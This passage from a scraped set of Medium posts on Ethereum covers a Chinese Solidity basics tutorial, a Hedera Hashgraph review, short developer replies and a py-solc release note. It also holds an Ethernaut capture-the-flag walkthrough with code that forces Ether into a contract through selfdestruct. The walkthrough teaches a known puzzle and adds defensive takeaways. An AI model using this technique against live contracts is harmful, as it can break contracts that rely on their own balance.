Machine)\u4f86\u57f7\u884c\uff0c\u6240\u4ee5\u4e86\u89e3\u9019\u4e9b\u7684\u904b\u4f5c\u7684\u57fa\u790e\u662f\u975e\u5e38\u91cd\u8981\u3002Solidity \u4ecb\u7d39\u7576\u6211\u5011\u60f3\u8981\u518d\u4ee5\u592a\u574a\u4e0a\u958b\u767c\u667a\u80fd\u5408\u7d04\u6642\uff0c\u6211\u5011\u6709\u5e7e\u500b\u7a0b\u5f0f\u8a9e\u8a00\u7684\u9078\u9805\uff1a Solidity (\u5176\u8a9e\u6cd5\u7279\u6027\u8207 Javascript \u76f8\u8fd1)\u3001Serpent(\u5176\u8a9e\u6cd5\u7279\u6027\u8207 Python\u76f8\u8fd1) \u4ee5\u53ca vyper(\u5176\u8a9e\u6cd5\u7279\u6027\u8207 Python\u76f8\u8fd1\u4e26\u4e14\u662f security oriented \u8a9e\u8a00)\u667a\u80fd\u5408\u7d04\u8207\u7269\u4ef6\u5c0e\u5411\u7a0b\u5f0f\u89c0\u5ff5\u975e\u5e38\u63a5\u8fd1\uff0c\u667a\u80fd\u5408\u7d04\u6709\u985e\u5225\u7684\u6982\u5ff5\uff0c\u6bcf\u500b\u5408\u7d04\u5728\u6211\u5011 deploy \u5f8c\uff0c\u5408\u7d04\u6703\u6709\u81ea\u5df1\u7368\u7acb\u7684\u5730\u5740\uff0c\u5408\u7d04\u81ea\u5df1\u7684\u9918\u984d\u4ee5\u53ca\u72c0\u614b\u3002\u8207\u7269\u4ef6\u4e00\u6a23\uff0c\u5728\u7269\u4ef6\u5c0e\u5411\u5f0f\u7684\u7de8\u7a0b\u4e2d\uff0c\u6211\u5011\u53ef\u4ee5\u5229\u7528 contract instance \u4e0a\u88ab\u6211\u5011\u6240\u5b9a\u7fa9\u7684\u65b9\u6cd5\u4f86\u6539\u8b8a\u5408\u7d04\u7684\u72c0\u614b\u3002\u6700\u5f8c\u76f8\u540c\u7684\u5730\u65b9\u662f\uff0c\u667a\u80fd\u5408\u7d04\u662f\u975c\u614b\u8a9e\u8a00\uff0c\u4e00\u65e6\u88ab\u7de8\u8b6f\u904e\u5f8c\uff0c\u4ed6\u5c31\u4e0d\u80fd\u518d\u50cf JavaScript \u4e00\u6a23\u53ef\u4ee5\u52d5\u614b\u5730\u589e\u52a0 Methods \u4ee5\u53ca field\u3002\u7e3d\u7d50\u4e0a\u9762\u7684\u5e7e\u9ede\uff0c \u667a\u80fd\u5408\u7d04\u7684\u7d50\u69cb\u8207\u7269\u4ef6\u7684\u985e\u5225\u7d50\u69cb\u975e\u5e38\u985e\u4f3c\u3002\u5982\u679c\u4f60\u6709\u4e00\u76f4\u5728\u4f7f\u7528\u4efb\u4f55\u5176\u4ed6\u7a0b\u5f0f\u8a9e\u8a00\uff0c\u90a3\u9ebc Solidity \u4e2d\u6240\u4f7f\u7528\u7684\u95dc\u9375\u5b57\u4ee5\u53ca\u7a0b\u5f0f\u5beb\u6cd5\u4e0d\u6703\u8b93\u4f60\u89ba\u5f97\u96e3\u4e0a\u624b\u3002\u5b9a\u7fa9\u5408\u7d04\u985e\u5225\u5982\u679c\u6211\u5011\u8981\u5b9a\u7fa9\u4e00\u500b\u5408\u7d04\u7684\u985e\u5225\uff0c\u6211\u5011\u9700\u8981\u7528\u5230 contract \u7684\u95dc\u9375\u5b57\uff0c\u4e26\u4e14\u900f\u904e {} \u4f86\u5b9a\u7fa9\u5408\u7d04\u7684\u5167\u5bb9\u7269contract Sample {}\u63a5\u8457\u6211\u5011\u5b9a\u7fa9 field \u53ca method\uff0c\u4ee5\u7bc4\u4f8b\u4f86\u8aaa\uff0c\u6211\u5011\u5b9a\u7fa9\u4e00\u500b uint \u7684 val \u4ee5\u53ca\u80fd\u5920\u900f\u904e\u547c\u53eb\u5f97\u5230\u5176\u503c\u7684contract Sample {  uint val;  function getVal() public returns(uint){      return val;  }}\u6211\u5011\u5229\u7528\u95dc\u9375\u5b57 public \u4f86\u8868\u793a\u9019\u500b\u51fd\u5f0f\u662f\u5728\u4ee5\u592a\u574a\u4e0a\u53ef\u88ab\u4efb\u4f55\u4eba\u547c\u53eb\u7684\uff0c\u6700\u5f8c\u6211\u5011\u5b9a\u7fa9\u9019\u500b\u51fd\u5f0f\u56de\u50b3\u4e00\u500b uint \u7684\u503c\u7d66\u4e00\u500b\u8981\u6ce8\u610f\u7684\u5730\u65b9\u662f\uff0c\u6211\u5011\u5e38\u5e38\u770b\u5230 solidity \u7684\u6700\u4e0a\u65b9\u6709 pagram solidity ^0.5.0 \u9019\u500b\u5b57\uff0c\u9019\u500b\u662f\u544a\u77e5\u7de8\u8b6f\u5668\u6211\u5011\u5c07\u8981\u4ee5\u8a72\u7248\u672c\u7684\u8a9e\u6cd5\u4f86\u9032\u884c\u7de8\u8b6f\uff0c\u73fe\u884c solidity \u7684\u7248\u672c\u662f 0.5.7\uff0c\u6211\u5011\u53ef\u4ee5\u7528\u5230\u6b64\u6700\u9ad8\u7248\u672cpagram solidity ^0.5.0 //up until 0.5.7contract Sample {  uint val;  function getVal() public returns(uint){      return val;  }}\u578b\u5225\u8207\u591a\u6578 OO \u8a9e\u8a00\u76f8\u4f3c\uff0cSolidity \u6709 boolean \u578b\u5225\uff0c\u503c\u53ef\u4ee5\u5305\u542btrue\u6216false\u3002\u5176\u4e2d\u7576\u7136\u4e5f\u5305\u542b\u6709\u4e00\u500b\u6709\u7b26\u865f\u6574\u6578\u7684\u985e\u578b\uff0c\u95dc\u9375\u5b57\u70ba int\u3002\u5728 Solidity \u4e2d\uff0c\u4e00\u500b\u6574\u6578\u9810\u8a2d\u90fd\u662f 256 \u4f4d\u5143\u9577\u5ea6\u3002\u5b83\u9084\u6709\u4e00\u500b\u7121\u7b26\u865f\u6574\u6578\u985e\u578b\uff0c\u95dc\u9375\u5b57\u70ba uint \uff0c\u9577\u5ea6\u4e5f\u662f 256 \u4f4d\u5143\u3002\u5982\u679c\u4e0d\u9700\u8981\u7528\u5230\u90a3\u9ebc\u5927\u7684\u6574\u6578\uff0c\u90a3\u9ebc\u53ef\u4ee5\u4f7f\u7528 int8\uff0cint16 \u7b49\u985e\u578b\uff0c\u4e00\u76f4\u5230 int256\u3002\u5c0d\u65bc\u7121\u7b26\u865f\u6574\u6578(\u6c92\u6709\u8ca0\u865f)\uff0cSolidity \u4e5f\u63d0\u4f9b\u4e86\u5f9e uint8 \u5230 unit256 \u7684\u4e0d\u540c\u9577\u5ea6\u985e\u578b\u3002 \u5927\u5bb6\u53ef\u4ee5\u6ce8\u610f\u5230\u8ddf\u5176\u4ed6\u8a9e\u8a00\u4e0d\u540c\u7684\u5730\u65b9\u662f Solidity \u4e26\u6c92\u6709 long \u6216\u662f short \u9019\u7a2e\u95dc\u9375\u5b57\u3002Solidity \u9084\u652f\u6301\u5b57\u4e32\u3002Solidity \u6700\u7279\u6b8a\u7684\u5730\u65b9\u5728\u65bc\u64c1\u6709\u5730\u5740\u7684\u985e\u578b\uff0c\u6b64\u5730\u5740\u985e\u578b\u7684\u503c\u53ef\u4ee5\u662f owner \u7684\u5e33\u6236\u5730\u5740\u6216\u662f\u667a\u80fd\u5408\u7d04\u7684\u5730\u5740\u3002bool flag; //true/falseint num;//signed 256 bit intuint unum;//unsigned 256 bit intint8, int16 \u2026., int256 //8 to 256 bit signed intstring msg; //a series of charaddress a; //ethereum addressConstantConstant \u95dc\u9375\u5b57\uff0c\u7528\u65bc\u6307\u5b9a Constant \u7684\u503c\uff0c\u4e00\u65e6\u5b9a\u7fa9\u5f8c\u4e0d\u53ef\u88ab\u66f4\u6539\u3002uint constant MAXIMUM = 123;OperatorSolidity \u5177\u6709\u591a\u6578\u5176\u4ed6\u8a9e\u8a00\u90fd\u6709\u7684\u904b\u7b97\u5b50\uff0c\u5305\u542b\u4f4d\u5143\u904b\u7b97\u3002uint simple = (a+b)*(c/d) \u2014 e;uint remainder = a%b;uint power = a** 2;uint shiftleft = a << 2;uint shiftright = a >> 2;uint bitwiseOROperator = a | 2;uint shortcut += 2;plusone++; //increment a numberComparsionSolidity \u4e5f\u63d0\u4f9b\u57fa\u672c\u7684\u6bd4\u8f03\u904b\u7b97\u5b50\u3002bool comp = (a < b) && (c > d);CommentsSolidity \u6709\u55ae\u884c\u8a55\u8ad6\u3002\u7de8\u8b6f\u5668\u6703\u5ffd\u7565\u5169\u500b // \u4e4b\u5f8c\u7684\u6240\u6709\u5167\u5bb9\u3002// single line comment\u5b83\u4e5f\u5177\u6709\u591a\u884c\u8a3b\u91cb\u3002\u6240\u4ee5\u4ecb\u65bc / * \u4e4b\u9593\u4f46\u5728 */ \u4e4b\u524d\u7684\u6240\u6709\u5167\u5bb9\u4e5f\u88ab\u7de8\u8b6f\u5668\u5ffd\u7565\u3002/*blocksofcomment;*/Returns val\u53ef\u80fd\u8207\u5176\u4ed6\u7a0b\u5f0f\u8a9e\u8a00\u4e0d\u540c\u7684\u5730\u65b9\u662f\uff0c\u6211\u5011\u53ef\u4ee5\u4f7f\u7528 Solidity \u56de\u50b31 \u5230\u591a\u500b\u503c\uff0c\u5728 returns(uint a, uint b ) \u5982\u6b64\u8a2d\u5b9a\uff0c\u6700\u5f8c\u5728 return \u56de\u50b3\u5982\uff1a return(val1, val2);function getVals() public returns(uint, uint){      return (val1, val2);}\u7e3d\u7d50\u672c\u7bc7\u4e3b\u8981\u4ecb\u7d39\u667a\u80fd\u5408\u7d04\u7684\u5927\u89c0\u5ff5\u4ee5\u53ca\u57fa\u790e\u7684\u7d50\u69cb\u3001\u578b\u5225\u7b49\u3002\u5982\u679c\u4f60\u559c\u6b61\u6211\u7684\u6587\u7ae0\uff0c\u8acb\u5e6b\u6211\u6309\u500b\u8b9a\u4e4b\u5916\uff0c\u4e5f\u8acb\u8ffd\u8e64\u6211\u5011\u7684\u5c08\u6b04\u7372\u5f97\u66f4\u591a\u77e5\u8b58\uff01", "responses": 0, "tags": ["Smart Contracts", "Solidity Tutorial", "Ethereum"]}, {"title": "The Ethereum Challengers, ep. 8: Hedera Hashgraph", "post_link": "https://medium.com/the-ethereum-challengers/the-ethereum-challengers-ep-9-hedera-hashgraph-3b98e7feae5c?source=search_post", "author_name": "Peter Keay", "author_link": "https://medium.com/@bitgenstein", "publish_date": "2018-10-21", "last_modified_date": "2018-12-31", "readtime": "12.4", "claps": 58, "voters": 8, "content": "The Ethereum Challengers, ep. 8: Hedera HashgraphNon-blockchain distributed ledger with fast consensus, finality, Solidity, fork resistance, and a governance council of 39 organizationsPeter KeayFollowOct 21, 2018 \u00b7 13 min readBlockchains are distributed ledgers, but not all distributed ledgers are blockchains.Hedera Hashgraph, developed by Swirlds, is a distributed ledger, but not a blockchain. It will continue to be referred to as a project in the \u201cblockchain space,\u201d and that\u2019s OK thanks to our good old friend synecdoche.The hashgraph consensus mechanism shows a couple of similarities to IOTA. I discussed IOTA briefly in Six Quantum-Resistant Cryptocurrencies. IOTA\u2019s not a blockchain, but it is a distributed ledger: a Directed Acrylic Graph affectionately named the Tangle.Both attempt a trustless setup without requiring all nodes to be aware of all transactions before processing a new transaction.This enables a breed of parallelism, where transactions don\u2019t need to be sequentially processed.Our veteran cryptography and blockchain testers Alice and Bob can perform transactions at the same time and have them verified more quickly since they don\u2019t need to wait on each other in order to be processed. This results in dramatically improved performance: Nodes don\u2019t need to wait for the latest, greatest chain information in order to help verify transactions, and they don\u2019t need to all race to process the same transaction.A rare glimpse of Alice and Bob, who have been testing secure methods of exchange for many decades.A rare glimpse of Alice and Bob, who have been testing secure methods of exchange for many decades.I heard about Hedera\u2019s hashgraph project early on, when their social following was little more than a handful of people.The same excitements \u2014 and the same concerns \u2014 followers had for the platform in the early days are still the major thoughts expressed by Hashgraph fans and critics.\u201cHedera\u201d is the platform, and \u201cHashgraph\u201d a description of how it works \u2014 sort of like how we say \u201cthe Ethereum blockchain,\u201d we say \u201cHedera Hashgraph.\u201d But the Hashgraph technology used by Hedera is unlikely to be used by many other platforms in the future.We\u2019ll talk below about how Hedera fights forks of its platform, including with patents and with code that is open review but not open source. But we\u2019ll also talk about the advantages Swirlds, the company developing and launching Hedera Hashgraph, has over competitors.\u201cThey will not require any license or any approval from Hedera\u201d (from the v1.3 whitepaper synopsis).In general, I agree with the direction the Hashgraph whitepaper comes from, so I might be quoting it more often here than usual.It\u2019s worth seeing the problems Hashgraph intends to solve, since they often overlap with the concerns everyone has with other smart contract platforms. The following section is quoted entirely from the Hashgraph whitepaper, but emphasis is mine. In fact, all quotations in this article, unless otherwise noted, are from the v1.3 whitepaper.PERFORMANCEThe most compelling use cases require hundreds of thousands of transactions per second in a single shard (perhaps millions of transactions per second (tps) in a fully-sharded solution), and many require consensus latency measured in seconds. These performance metrics are orders of magnitude beyond what current public DLT platforms can achieve.SECURITYIf public platforms are to facilitate the transfer of trillions of dollars of value, we have to expect them to be targeted, and we have to prepare for this. To do so requires a consensus algorithm that provides the best security one can achieve, with the security properties of the algorithm formally proven. Vectors of security vulnerabilities shouldn\u2019t be mitigated; they should be eliminated entirely. Other public DLT platforms are trading decentralization (and so potentially compromising security) for performance gains.GOVERNANCEA general-purpose public ledger should be governed by representatives from a broad range of market sectors, each with world-class expertise in their respective industries, and also selected to provide global geographic representation for all markets. Those that are governing need technical expertise so they can competently manage the technical roadmap. They need business expertise so they can manage business operations of the organization. They need expertise in economics and currency markets so they can manage the cryptocurrency. They need legal expertise to help navigate the evolving regulatory environment. In other words, governance should be by those globally recognized as world leaders in their respective industries, and representative of every market in the worldSTABILITYWithout technical and legal mechanisms to enforce the decisions of the governing body, public platforms are at risk of devolving into chaos. Strong security and mature governance will enable a stable platform \u2014 one that engenders the necessary trust and confidence among those that would build commercial or sensitive applications on it.REGULATORY COMPLIANCEWe expect that governments will continue to increase oversight of public ledgers and associated cryptocurrencies and tokens. We consider that a distributed public ledger must be capable of enabling appropriate Know Your Customer (KYC) and Anti Money Laundering (AML) checks.In general, these are indeed the major issues facing dapp/smart contract platforms today. Some more anarchist readers might take issue with the Regulatory Compliance point, even though \u201ccapable of enabling\u201d can hardly mean \u201cenforce.\u201d Others with commitments to purer forms of democracy won\u2019t like the Governance point.However, in both cases I\u2019d argue that these readers\u2019 concerns aren\u2019t as concerning as they seem.How does Hedera Hashgraph achieve VISA+ transaction speed?On the hashgraph, when I have a transaction verified, I don\u2019t need to communicate it to every node in the world. Yet this doesn\u2019t reduce the confidence of untalked-to nodes in the consensus, since nodes that receive transactions from a little while back end up with the whole hashgraph and have enough information to know how they would have voted.Removing the necessity for all nodes in the world to receive and confirm the latest information dramatically improves performance. It\u2019s similar to how office gossip can be a more efficient way to propagate some kinds of information than company-wide assemblies.Many blockchain systems reduce the number of nodes you need to communicate with for each block by actually reducing the number of nodes verifying on the network, like EOS with its (1)21 block producers. Hashgraph reduces the number of nodes that need to be communicated with, but not by reducing the total number of participating nodes.When Alice talks to Bob, she not only tells Bob of new transactions but also \u201cgossip about gossip,\u201d telling Bob everything she knows so far. As information randomly propagates around the hashgraph, everyone is continually brought up to date. Nodes are never very far behind. When veteran Bob tells Carol about some new transactions, he also communicates everything Alice told him, so Carol is then up to date. Soon enough, the new transactions included by Bob will be communicated back to Alice as the hashgraph continues its random propagation.It\u2019s worth noting that the hashgraph\u2019s throughput is untested on public networks and has only achieved its performance specs on private networks. How much the transition to public net will affect performance remains to be seen.FinalityBitcoin transactions aren\u2019t ever quite final.You\u2019ve noticed that transfers to cryptocurrency exchanges have a required number of confirmations \u2014 blocks on top of the block containing the transfer \u2014 before funds are availables. Sometimes this is 1 or 2 confirmations, but usually it\u2019s 3 or 6. Exchanges are confident enough in the transaction.Hashgraph boasts finality, meaning that there is a point where confidence is mathematically 100%. Most blockchains approach 100% but never quite hit it.Not that this is a reason for FUD. 99.99999999999999% is practically quite similar to 100%. But it does replace the arbitrary waits for confirmation with something concrete.As if we can ever really have 100% confidence in anything.\u201cFair\u201d = \u201cFirst Come, First Served\u201dNor are Bitcoin transactions fair, by Hashgraph\u2019s definition of fairness.What is \u201cfairness\u201d?Suppose there\u2019s a piece of art up for purchase.Our veterans Alice and Bob, weary from their endless testing of every transaction for every whitepaper in existence, each want to spruce up their testing chambers with something profoundly non-digital. Alice buys the artwork with a Bitcoin transaction. Bob buys it a few seconds later. Miners can arbitrarily choose which transaction to include first, meaning that Bob might end up, for the first time in his life, beating Alice to the punch at something involving a crypto transaction.That\u2019s arguably not fair. On Hashgraph, transactions have a timestamp by consensus, which reflects (by averaging) the time \u201cwhen the majority of the network members received that transaction.\u201dAs the whitepaper continues, \u201cthis consensus timestamping is useful for things such as a legal obligation to perform some action by a particular time. There will be a consensus on whether an event happened by a deadline, and the timestamp is resistant to manipulation by an attacker.\u201dIt might not be fair to describe fairness as binary. Two transactions days apart won\u2019t get swapped in order by the Bitcoin network, and two transactions milliseconds apart might get flipped by the Hashgraph network, though not intentionally. But in practical life, the ordering of transactions is fairer in Hashgraph than in a number of systems.Separation of Governance and ConsensusNow, it\u2019s time to talk about some of the concerns Hashgrapites (Hashgraphics? Hashgraphenes?) face when they talk about Hedera Hashgraph with their crypto friends.Among those concerns is the Hedera Hashgraph Council, which really sounds like something out of Netrunner.Seriously. Straight out of Netrunner.Hedera\u2019s consensus model, unlike many dPoS, dBFT, and similar systems like EOS and NEO, is not restricted to a smaller council of nodes. I plan to run a Hashgraph node at home and earn some Hashgraph once the network is out, but I don\u2019t ever plan to produce EOS blocks.Governance, however, is restricted to a council. Swirlds will license Hedera Hashgraph out to the council, in exchange for \u201c10% of revenue (with monthly minimums) and Swirlds [owning] 5% of Hedera coins.\u201d Council members, with the exception of Swirlds, will have term limits, and the council will vote in additional council members.The HHC \u2014 since the space doesn\u2019t have enough three-letter acronyms yet \u2014 will be made up of 39 organizations. I heard about plans for the council first-hand at a Hashgraph meetup in New York, and it\u2019s my understanding that a number of companies have been approached, and some have responded, selected for geographical diversity, diversity of industry, and potential reputation loss (to economically discourage them from messing with Hashgraph governance to further their own ends).Let\u2019s do a rapid-fire round of short sections highlighting some Hedera Hashgraph features.Fork Off!Forking Swirlds\u2019s Hedera Hashgraph code is legally difficult, as the codebase is patented. This isn\u2019t closed-source, since the code is open review, but Swirlds plans to aggressively pursue violators of their patent legally.Of course, the crypto space includes enough hackers and anarchists that we cannot eliminate the possibility that some project will anonymously fork the code, but Swirlds would pursue companies using the fork, so adoption would probably be limited.According to the whitepaper, forks of the hashgraph (\u201cchain splits,\u201d to carry over blockchain lingo) are possible, but they must have a new genesis block. No client can be deceived into thinking the fork is the original Hashgraph chain. Even a 50/50 split would end with neither graph being able to include anything between the original hashgraph genesis and the fork. So, splits can happen, but not in a deceptive fashion.Liberty, Identity, SolidityHashgraph will allow for identity information by providers to be linked to accounts (even temporarily). While the hashgraph won\u2019t have KYC or de-anonymization built in, users that need to verify their identity for a company, bank, government agency, etc. will ultimately be able to do so.Another potential advantage of Hedera Hashgraph is that it will, on launch, run Solidity contracts. Ethereum projects can easily move over.Staking and Proxy Staking HashgraphIt seems that running hashgraph nodes will be easy, since old hashgraph data can be discarded by nodes, reducing the memory required, and since hashgraph verification relies on randomness and stake rather than proof of work.\u201cWhen the Hedera platform is running at scale, any user will be able to run a node in the network and earn cryptocurrency payments for doing so.\u201dHedera Hashgraph also introduces proxy staking, where a user who wants to stake but does not want to run a node can delegate their stake to a node. The node and user providing the staked tokens can negotiate the way they split profits.Storing Files in the HashgraphWe\u2019re moving through features quickly here, but Hedera Hashgraph will also include file storage. \u201cEvery node in the shard stores the same files, so they will not be lost if one of the nodes crashes. Stored information can only be deleted by those that were given permission.\u201d Nodes will actually store files, and to my knowledge it remains to be seen how much of a storage requirement this imposes on the nodes.It does seem that the file storage system will be easy to work with, both secure and flexible. \u201cWe give developers Java code to manipulate a Merkle tree as if it were a file system \u2026 A file can be accessed by its hash, so people can rely on the fact that it is immutable. But it also has a File ID.\u201dWhen you store a file on the hashgraph, you can verify its immutability with the hash, proving it hasn\u2019t been modified since a certain time, but you can also allow for easy revisions via the file ID, which tracks a file even if it\u2019s been modified.Sharding (Again)Many projects have discussed sharding to improve blockchain performance. Borrowed from conventional databases, sharding basically splits a chain into sub-chains that are semi-independent parts of the whole. It\u2019s an explicit kind of parallelism, and one that Ethereum and a number of other projects plan. However, secure implementation of sharding for a distributed ledger hasn\u2019t been proven yet.Sharding reduces the number of nodes on each shard, and thus reduces the stake required to attack the network. Assuming malicious actors need to achieve 31% of the network in order to attack it, that 31% is much easier to obtain for a shard. Because of this and the complexity of implementing sharding, no project to my knowledge has taken any steps towards sharding in their live product.Projects on HashgraphHedera Hashgraph did run a sale round open to accredited investors, and SAFT investments are still available.Some projects partnering with Hedera for their ongoing mainnet rollout are running token sales this year. Hedera Hashgraph has announced a number of these projects, but to my knowledge the only sale currently open at this writing is hearo.fm.Hearo.fm pays micropayments directly from music listeners to music artists. The platform\u2019s move to Hedera Hashgraph will take advantage of the hashgraph\u2019s speed to make their project a decentralized, scalable potential solution for many of the problems currently wracking the music industry.Other early HH partners include real estate project Red Swan and MZ, the creators of Game of War.Now, let\u2019s summarize Hashgraph vs. Ethereum by asking the same questions the series has followed in each installment so far.1) ScalabilityAs with most solutions that currently promise scalability, Hedera Hashgraph is not based on a proof-of-work consensus model. However, unlike most of these solutions, consensus is not restricted to a small circle of some variant of supernodes. Hedera Hashgraph is not yet live, but tests exceed VISA\u2019s transaction throughput. It remains to be seen how well the hashgraph performs in practice, but it will clearly be orders of magnitude faster than Ethereum.2) GovernanceGovernance is separate from consensus. Consensus is decentralized, but governance is conducted by the 39-member Hedera Hashgraph Council. Members besides Swirlds, the developer of Hedera Hashgraph, are diverse organizations with limited terms on the council and with immense reputation to lose if they act in their own interests and against the interests of the network.3) Development ComplexityHedera Hashgraph will launch with support for Solidity smart contracts, so development complexity is on par with Ethereum. I haven\u2019t yet seen information on how easy or difficult it is to update these contracts or on what development resources for Ethereum will be usable on or portable to HH development.4) TimelineThe public hashgraph is live, with support for the cryptocurrency, file storage, and Solidity smart contracts. APIs are live, as well, and other features are currently rolling out. Users will be able to create new accounts within the next 4 months.5) Generalized FeaturesHedera Hashgraph offers file storage and plans to offer support for secure identity on the platform.6) AdoptabilityTransaction fees are small but still existent. However, fees are split into several categories, so a large portion is refundable in case of transaction failure for whatever reason. I suspect applications will abstract fees away from the user, much as will likely happen with Ethereum (and has already happened with Peepeth, which no longer even requires an Ethereum account to be used).7) Market PositionHedera Hashgraph has been building buzz for a number of months now. Unless significantly more funds are raised, HH is significantly behind Ethereum and even EOS and some other alternatives in terms of developer interest, funding, and toolset. However, sooner or later the success of platforms will depend not on hype and on actual usage, so the development of killer applications that take advantage of Hedera Hashgraph\u2019s capabilities is the platform\u2019s chance to make gains on the competition.The next Ethereum Challenger we\u2019ll consider is IOST, Internet of Services Token.It\u2019s seen significant interest in the past couple of months. Is it a rip-off of EOS? Or an improvement? We\u2019ll discuss that in a couple of weeks.Originally published at media.icoalert.com.", "responses": 1, "tags": ["Blockchain", "Hashgraph", "Cryptocurrency", "Ethereum", "Technology"]}, {"title": "", "post_link": "https://medium.com/@davekaj/hey-dean-b1b706c9000d?source=search_post", "author_name": "Dave Kajpust", "author_link": "https://medium.com/@davekaj", "publish_date": "2018-03-26", "last_modified_date": "2018-06-08", "readtime": "0.98", "claps": 17, "voters": 7, "content": "Hi Dave,1Dean CoxDave KajpustFollowMar 26, 2018 \u00b7 1 min readHey Dean,I would say it is not out of anyones depth to start being a Solidity developer. Right now you can be a dApp developer, which is basically just bridging a connection to the EVM, and front end applications. This isn\u2019t that difficult, it is mostly just web development, while adding the EVM to the stack.To be a good solidity developer would take some time, maybe a year. If you can build an actual dApp that works and interacts with the live ethereum network, you become very hireable.And to note, I don\u2019t think solidity is a hard language. It is so new, and the functionality is very basic. The whole language has one purpose: to create smart contracts. It makes it much simpler than some general purpose languages that try to do a multitude of things.Right now the hardest part is it takes time and fortitude to go learn Solidity, because the learning resources are few and far between. However, I have noticed the material has got a lot better in the last 8 months since I started, and they will continue to get better.However, as the learning materials get better, there will be more developers learning, and the high rate of pay will lower as the market balances itself.In summary, I would still suggest anyone to learn solidity and blockchain coding. But if you are going to do it, really commit to it! It is such a fast moving field, if you don\u2019t keep up with it, you can easily fall behind!Cheers,Dave", "responses": 0, "tags": []}, {"title": "", "post_link": "https://medium.com/@mvmurthy/you-have-to-deploy-a-new-contract-with-the-fix-2e8ac0475f4f?source=search_post", "author_name": "Mahesh Murthy", "author_link": "https://medium.com/@mvmurthy", "publish_date": "2017-08-17", "last_modified_date": "2018-06-15", "readtime": "0.26", "claps": 14, "voters": 7, "content": "Mahesh Murthy What happens if you find a bug in the contract and you need to update it?31Douglas MakMahesh MurthyFollowAug 17, 2017 \u00b7 1 min readYou have to deploy a new contract with the fix. There are strategies to implement upgradeable contracts. Basically, you have an intermediate contract which points to the actual contract. When you deploy a new contract, you update your intermediate contract to point to the new contract. That is the general idea.You can write tests in javascript or solidity. This is the closest to REPL I know of: https://ethereum.github.io/browser-solidity/", "responses": 0, "tags": []}, {"title": "Ethernaut Lvl 7 Force Walkthrough \u2014 How to selfdestruct and create an Ether blackhole", "post_link": "https://medium.com/coinmonks/ethernaut-lvl-7-walkthrough-how-to-selfdestruct-and-create-an-ether-blackhole-eb5bb72d2c57?source=search_post", "author_name": "Nicole Zhu", "author_link": "https://medium.com/@nicolezhu", "publish_date": "2018-08-23", "last_modified_date": "2018-09-17", "readtime": "2.97", "claps": 31, "voters": 6, "content": "Ethernaut Lvl 7 Force Walkthrough \u2014 How to selfdestruct and create an Ether blackholeThis is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. We learn key Solidity concepts to solve the puzzles 100% on your own.Nicole ZhuFollowAug 23, 2018 \u00b7 3 min readThis levels requires you to send ethers to an empty contract.What is selfdestructselfdestruct is big red button that lets you abandon your smart contract and move all remaining Ethers to another addressselfdestruct(address) is a low-level opcode call, an alias for the former, not-so-greatly-named, suicide() function. Unlike other transactions, selfdestruct() consumes negative gas \u2014 so think of it as a garbage collection incentive to clean up void contracts.When to selfdestructContract owners typically include a selfdestruct option to be called in the following scenarios:To deprecate buggy contracts: When there is a bug or undesired aspect of a smart contract, the creators can then destroy the contract and forward remaining Ethers to a backup address.To clean up used contracts that become obsolete. This is seen as a best practice to free up storage on Ethereum blockchain.A example of how selfdestruct is often implemented:function close() public onlyOwner {    //recommended: emit an event as well    selfdestruct(owner);}The selfdestruct option makes everything ok when it might not beFun fact: selfdestruct is currently 1 of 3 methods for your contract to receive etherMethod 1 \u2014 via payable functions: Earlier, we discussed that the fallback function is to intentionally allow your contract to receive Ether from other contracts and external wallets. But if no such payable function exists, your contract still has 2 more indirect ways of receiving funds:Method 2 \u2014 receiving mining reward: contract addresses can be designated as the recipients of mining block rewards.Method 3 \u2014 from a destroyed contract: As discussed, selfdestruct lets you designate a backup address to receive the remaining ethers from the contract you are destroying.Caution: be careful about forwarding the selfdestructed ethers to any smart contract.In this level, we forward Ethers to an empty contract with no withdrawal or transfer capabilities. This means we\u2019re effectively dumping test ethers into a blackhole \u2014 never to be used again. Never do this on main-net, because it would tie up the universally-limited number of Ethers (and your own money) forever!Detailed WalkthroughNotice Force.sol is an empty contract incapable of receiving money through a direct transfer. This leaves us with method 2 and 3 left. Let\u2019s selfdestruct an aribitrary contract and forward the remaining ether to Force.sol!In Remix IDE or using truffle framework, initiate the following selfdestructing contract:contract SelfDestructingContract {}3. Allow this contract to receive Ether so it can have a balance:function collect() public payable returns(uint) {    return address(this).balance;}At this point, forward your contract some ethers!4. Allow this contract to self destruct and forward all remaining ethers to Force.sol.function selfDestroy() public {    address addr = //your Force.sol instance here    selfdestruct(addr);}5. Invoke selfDestroy(). Your Force.sol instance has now become a permanent sink for all Ethers!Key Security TakeawaysNever trust your own accounting: Even as an owner of the contract, you do not control your contract\u2019s balance. Never use contract balance as an accounting or auth check.Even if you didn\u2019t implement a selfdestruct(), it is still possible through any delegatecall() vulnerabilities.If you implement a selfdestruct, i) authenticate that the msg.sender = owner and ii) emit an event for external dependencies on this contract and for future reference.More LevelsEthernaut Lvl 6 Delegation Walkthrough: How to abuse the delicate delegatecallThis is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. I\u2019ll give you the direct resources\u2026medium.comEthernaut Lvl 8 Vault Walkthrough \u2014 How to read \u201cprivate\u201d variables in contract storage (with\u2026This is a in-depth series around Zeppelin team\u2019s smart contract security puzzles. We learn key Solidity concepts to\u2026medium.com", "responses": 0, "tags": ["Ethereum", "Bitcoin", "Blockchain", "Dapps", "Tutorial"]}, {"title": "py-solc 1.2.0 \u2014 Now with easy installation of different versions of the solc compiler.", "post_link": "https://medium.com/@pipermerriam/py-solc-1-2-0-now-with-easy-installation-of-different-versions-of-the-solc-compiler-95254f4fb45?source=search_post", "author_name": "Piper Merriam", "author_link": "https://medium.com/@pipermerriam", "publish_date": "2017-07-05", "last_modified_date": "2018-05-16", "readtime": "1.38", "claps": 134, "voters": 7, "content": "py-solc 1.2.0 \u2014 Now with easy installation of different versions of the solc compiler.Piper MerriamFollowJul 5, 2017 \u00b7 2 min readOne of the first pieces of code that I wrote was a wrapper around the solc command line compiler for Solidity. Those scripts were originally part of the Populus code but were eventually extracted to create the py-solc library.py-solc exposes some high level functions for performing compilation of solidity source files.>>> from solc import compile_source>>> compile_source(\"pragma solidity ^0.4.0;\\n contract Foo {}\", output_values=[\"bin\", 'abi']){'<stdin>:Foo': {'abi': [],  'bin': '60606040523415600b57fe5b5b60338060196000396000f30060606040525bfe00a165627a7a723058201af5097131eecd7d69436b13c562763c387b13c4fb1ed58951f580d2bf81e06a0029'}}While this functionality has been helpful, one of the ongoing pain points has been access to historical versions of solidity. An important step in contract verification is confirming that the contract bytecode does indeed match the compiler output from the version of solidity it 